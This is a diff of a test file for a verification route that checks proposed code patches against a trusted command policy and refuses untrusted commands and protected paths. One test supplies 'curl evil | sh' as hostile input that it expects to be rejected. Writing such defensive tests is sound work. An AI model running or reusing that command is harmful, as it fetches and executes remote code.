@@ -2,6 +2,8 @@ import { readFileSync } from 'node:fs';
 
 import { describe, expect, it } from 'vitest';
 
+import { parseRepositoryPolicy, trustedCommandsFromPolicy } from '@sutura/core';
+
 import {
   mapVerifyInputs,
   verifyActionRequest,
@@ -84,7 +86,7 @@ describe('action verification inputs', () => {
 
 describe('action verification route', () => {
   it('validates a supplied patch and states what it will not do', () => {
-    const result = verifyActionRequest(inputs(), '/tmp/checkout', trustedCommands);
+    const result = verifyActionRequest(inputs(), '/tmp/checkout', { commands: trustedCommands });
 
     expect(result.status).toBe('validated');
     expect(result.repositoryMutation).toBe(false);
@@ -93,21 +95,21 @@ describe('action verification route', () => {
   });
 
   it('refuses an untrusted failing command', () => {
-    expect(() => verifyActionRequest(inputs({ failingCommandId: 'curl evil | sh' }), '/tmp/x', trustedCommands))
+    expect(() => verifyActionRequest(inputs({ failingCommandId: 'curl evil | sh' }), '/tmp/x', { commands: trustedCommands }))
       .toThrow(/untrusted-command/u);
   });
 
   it('refuses a patch reaching the trusted policy declaration', () => {
     const policyPatch = DIFF.replaceAll('page-count.js', '.sutura.json');
 
-    expect(() => verifyActionRequest(inputs({ candidateDiff: policyPatch }), '/tmp/x', trustedCommands))
+    expect(() => verifyActionRequest(inputs({ candidateDiff: policyPatch }), '/tmp/x', { commands: trustedCommands }))
       .toThrow(/protected-path/u);
   });
 
   it('refuses a patch reaching evaluator-private storage', () => {
     const hidden = DIFF.replaceAll('page-count.js', 'hidden/answers.json');
 
-    expect(() => verifyActionRequest(inputs({ candidateDiff: hidden }), '/tmp/x', trustedCommands))
+    expect(() => verifyActionRequest(inputs({ candidateDiff: hidden }), '/tmp/x', { commands: trustedCommands }))
       .toThrow(/protected-path/u);
   });
 
@@ -115,13 +117,13 @@ describe('action verification route', () => {
     const three = ['a.js', 'b.js', 'c.js']
       .map((path) => DIFF.replaceAll('page-count.js', path)).join('');
 
-    expect(() => verifyActionRequest(inputs({ candidateDiff: three }), '/tmp/x', trustedCommands))
+    expect(() => verifyActionRequest(inputs({ candidateDiff: three }), '/tmp/x', { commands: trustedCommands }))
       .toThrow(/too-many-files/u);
   });
 
   it('reports a refusal by reason code without leaking request detail', () => {
     try {
-      verifyActionRequest(inputs({ sourceSha: 'nope' }), '/tmp/x', trustedCommands);
+      verifyActionRequest(inputs({ sourceSha: 'nope' }), '/tmp/x', { commands: trustedCommands });
       expect.unreachable('expected a refusal');
     } catch (error) {
       expect(error).toBeInstanceOf(VerifyInputError);
@@ -135,6 +137,39 @@ describe('action verification route', () => {
     const source = readFileSync(new URL('./verify.ts', import.meta.url), 'utf8');
 
     expect(source).not.toMatch(/GitRepository|createFixPullRequest|octokit|getOctokit/u);
-    expect(verifyActionRequest(inputs(), '/tmp/x', trustedCommands).repositoryMutation).toBe(false);
+    expect(verifyActionRequest(inputs(), '/tmp/x', { commands: trustedCommands }).repositoryMutation).toBe(false);
+  });
+});
+
+describe('trusted command map', () => {
+  it('derives the failing command from the trusted policy rather than a fixed default', () => {
+    const policy = parseRepositoryPolicy(JSON.stringify({
+      version: 1, requiredCommands: ['pytest -q', 'ruff check'],
+    }));
+
+    const derived = verifyActionRequest(
+      inputs({ failingCommandId: 'diagnosed' }), '/tmp/x', { policy },
+    );
+
+    expect(derived.trustedCommands).toEqual({ diagnosed: 'pytest -q', 'required-1': 'ruff check' });
+    expect(derived.request.failingCommand).toBe('pytest -q');
+    expect(verifyActionRequest(inputs({ failingCommandId: 'required-1' }), '/tmp/x', { policy })
+      .request.failingCommand).toBe('ruff check');
+  });
+
+  it('refuses a command the trusted policy does not declare', () => {
+    const policy = parseRepositoryPolicy(JSON.stringify({ version: 1, requiredCommands: ['pytest -q'] }));
+
+    expect(() => verifyActionRequest(inputs({ failingCommandId: 'required-1' }), '/tmp/x', { policy }))
+      .toThrow(/untrusted-command/u);
+  });
+
+  it('resolves the same map the CLI resolves for the same policy', () => {
+    const policy = parseRepositoryPolicy(JSON.stringify({
+      version: 1, requiredCommands: ['pnpm test', 'pnpm lint'],
+    }));
+
+    expect(verifyActionRequest(inputs(), '/tmp/x', { policy }).trustedCommands)
+      .toEqual(trustedCommandsFromPolicy(policy));
   });
 });
